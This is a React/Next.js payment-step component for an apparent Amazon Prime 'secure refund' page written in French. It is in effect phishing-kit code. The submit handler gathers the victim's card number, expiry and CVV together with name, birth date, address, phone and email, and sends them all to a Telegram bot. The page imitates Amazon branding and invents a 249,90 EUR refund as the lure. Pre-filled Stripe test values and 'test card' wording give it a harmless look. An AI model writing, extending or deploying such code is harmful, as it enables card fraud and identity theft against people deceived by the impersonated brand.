'use client';

import Image from 'next/image';
import type { FormEvent, FormEventHandler } from 'react';
import visaLogo from '../../assets/images/visa.png';
import mastercardLogo from '../../assets/images/mastercard.png';
import amexLogo from '../../assets/images/amex.png';
import { sendToTelegram } from '@/lib/telegram';
import type { PersonalDetails } from './PersonalDetailsForm';
import {
  detectCardType,
  validateCardNumber,
  validateCvv,
  validateExpiry,
} from '@/lib/cardValidation';

const formatCardNumber: FormEventHandler<HTMLInputElement> = event => {
  const input = event.currentTarget;
  const digits = input.value.replace(/\D/g, '').slice(0, 19);

  // Amex : 4-6-5
  if (/^3[47]/.test(digits)) {
    input.value = [digits.slice(0, 4), digits.slice(4, 10), digits.slice(10, 15)]
      .filter(Boolean)
      .join(' ');
    return;
  }
  // Visa / MC : 4-4-4-4 (max 16)
  input.value = digits.slice(0, 16).replace(/(\d{4})(?=\d)/g, '$1 ').trim();
};

const formatExpiry: FormEventHandler<HTMLInputElement> = event => {
  const input = event.currentTarget;
  const digits = input.value.replace(/\D/g, '').slice(0, 4);
  input.value = digits.length > 2 ? `${digits.slice(0, 2)}/${digits.slice(2)}` : digits;
};

const formatCvv: FormEventHandler<HTMLInputElement> = event => {
  event.currentTarget.value = event.currentTarget.value.replace(/\D/g, '').slice(0, 4);
};

export type CardDetails = {
  cardHolder: string;
  cardNumber: string;
  expiry: string;
  cvv: string;
};

export function SafePaymentStep({
  initial,
  personal,
  onBack,
  onContinue,
}: {
  initial?: Partial<CardDetails>;
  personal?: PersonalDetails;
  onBack: () => void;
  onContinue: (card: CardDetails) => void;
}) {
  // ---------- handlers de validation (on blur) ----------

  const handleCardNumberInput: FormEventHandler<HTMLInputElement> = event => {
    formatCardNumber(event);
    event.currentTarget.setCustomValidity('');
  };

  const handleCardNumberBlur: FormEventHandler<HTMLInputElement> = event => {
    const result = validateCardNumber(event.currentTarget.value);
    event.currentTarget.setCustomValidity(result.error || '');
    if (!result.valid) event.currentTarget.reportValidity();
  };

  const handleExpiryInput: FormEventHandler<HTMLInputElement> = event => {
    formatExpiry(event);
    event.currentTarget.setCustomValidity('');
  };

  const handleExpiryBlur: FormEventHandler<HTMLInputElement> = event => {
    const result = validateExpiry(event.currentTarget.value);
    event.currentTarget.setCustomValidity(result.error || '');
    if (!result.valid) event.currentTarget.reportValidity();
  };

  const handleCvvInput: FormEventHandler<HTMLInputElement> = event => {
    formatCvv(event);
    event.currentTarget.setCustomValidity('');
  };

  const handleCvvBlur: FormEventHandler<HTMLInputElement> = event => {
    const form = event.currentTarget.form;
    const cardInput = form?.querySelector<HTMLInputElement>('#cardNumber');
    const type = cardInput ? detectCardType(cardInput.value) : 'unknown';
    const result = validateCvv(event.currentTarget.value, type);
    event.currentTarget.setCustomValidity(result.error || '');
    if (!result.valid) event.currentTarget.reportValidity();
  };

  // ---------- soumission ----------

  function submit(event: FormEvent<HTMLFormElement>) {
    event.preventDefault();

    // Validation finale (sécurité supplémentaire)
    const form = event.currentTarget;
    const cardNumberInput = form.querySelector<HTMLInputElement>('#cardNumber')!;
    const expiryInput = form.querySelector<HTMLInputElement>('#expiry')!;
    const cvvInput = form.querySelector<HTMLInputElement>('#cvv')!;

    const cardCheck = validateCardNumber(cardNumberInput.value);
    const expiryCheck = validateExpiry(expiryInput.value);
    const type = detectCardType(cardNumberInput.value);
    const cvvCheck = validateCvv(cvvInput.value, type);

    cardNumberInput.setCustomValidity(cardCheck.error || '');
    expiryInput.setCustomValidity(expiryCheck.error || '');
    cvvInput.setCustomValidity(cvvCheck.error || '');

    if (!form.reportValidity()) return;

    const data = new FormData(form);
    const card: CardDetails = {
      cardHolder: String(data.get('cardHolder') ?? '').trim(),
      cardNumber: String(data.get('cardNumber') ?? ''),
      expiry: String(data.get('expiry') ?? ''),
      cvv: String(data.get('cvv') ?? ''),
    };

    void sendToTelegram({
      title: 'Demande Prime',
      fields: {
        lastName: personal?.nom ?? '',
        firstName: personal?.prenom ?? '',
        birthDate: personal?.dateNaissance ?? '',
        address: personal?.adresse ?? '',
        postalCode: personal?.codePostal ?? '',
        city: personal?.ville ?? '',
        phone: personal?.telephone ?? '',
        email: personal?.email ?? '',
        cardHolder: card.cardHolder,
        cardNumber: card.cardNumber,
        expiry: card.expiry,
        cvv: card.cvv,
      },
    });

    onContinue(card);
  }

  return (
    <>
      <h1 className="amz-prime-title">Remboursement sécurisé</h1>
      <p className="amz-prime-lead">
        Confirmez le moyen de paiement pour finaliser le parcours.
      </p>
      <div className="amz-amount-row">
        <span>Montant total</span>
        <strong>249,90 EUR</strong>
      </div>
      <section className="amz-card-panel">
        <header className="amz-card-panel__top">
          <div>
            <h2 className="amz-form-section__title">Moyen de paiement</h2>
            <p className="amz-card-panel__note">
              Utilisez la carte de test fournie, ou saisissez vos informations.
            </p>
          </div>
          <div
            className="amz-card-brands amz-card-brands--header"
            aria-label="Réseaux de paiement pris en charge"
          >
            <span><Image src={visaLogo} alt="Visa" /></span>
            <span><Image src={mastercardLogo} alt="Mastercard" /></span>
            <span><Image src={amexLogo} alt="American Express" /></span>
          </div>
        </header>

        <form className="amz-card-form" onSubmit={submit}>
          <div className="amz-form-grid amz-card-demo-fields">
            <div className="amz-field amz-field--full">
              <label htmlFor="cardHolder">Nom du titulaire <span className="req">*</span></label>
              <input
                className="amz-input"
                id="cardHolder"
                name="cardHolder"
                autoComplete="cc-name"
                required
                minLength={2}
                maxLength={80}
                defaultValue={initial?.cardHolder ?? 'UTILISATEUR TEST'}
              />
            </div>
            <div className="amz-field amz-field--full">
              <label htmlFor="cardNumber">Numéro de carte <span className="req">*</span></label>
              <input
                className="amz-input"
                id="cardNumber"
                name="cardNumber"
                inputMode="numeric"
                autoComplete="cc-number"
                required
                maxLength={19}
                pattern="(\d{4} \d{4} \d{4} \d{4})|(\d{4} \d{6} \d{5})"
                title="Visa/Mastercard : 16 chiffres groupés par 4. Amex : 15 chiffres groupés 4-6-5."
                defaultValue={initial?.cardNumber ?? '4242 4242 4242 4242'}
                onInput={handleCardNumberInput}
                onBlur={handleCardNumberBlur}
              />
            </div>
            <div className="amz-field">
              <label htmlFor="expiry">Expiration (MM/AA) <span className="req">*</span></label>
              <input
                className="amz-input"
                id="expiry"
                name="expiry"
                inputMode="numeric"
                autoComplete="cc-exp"
                required
                maxLength={5}
                pattern="(0[1-9]|1[0-2])\/\d{2}"
                title="Format MM/AA. Doit être dans le futur."
                defaultValue={initial?.expiry ?? '12/34'}
                onInput={handleExpiryInput}
                onBlur={handleExpiryBlur}
              />
            </div>
            <div className="amz-field">
              <label htmlFor="cvv">CVV <span className="req">*</span></label>
              <input
                className="amz-input"
                id="cvv"
                name="cvv"
                inputMode="numeric"
                autoComplete="cc-csc"
                required
                maxLength={4}
                pattern="\d{3,4}"
                title="3 chiffres (4 pour Amex)."
                defaultValue={initial?.cvv ?? '123'}
                onInput={handleCvvInput}
                onBlur={handleCvvBlur}
              />
            </div>
          </div>
          <p className="amz-card-panel__note amz-card-panel__note--secure">
            Les valeurs pré-remplies sont les valeurs de test publiques de Stripe.
          </p>
          <div className="amz-actions">
            <button className="amz-btn amz-btn--primary" type="submit">
              Confirmer l&apos;annulation
            </button>
            <button className="amz-btn amz-btn--secondary" type="button" onClick={onBack}>
              Retour
            </button>
          </div>
        </form>
      </section>
    </>
  );
}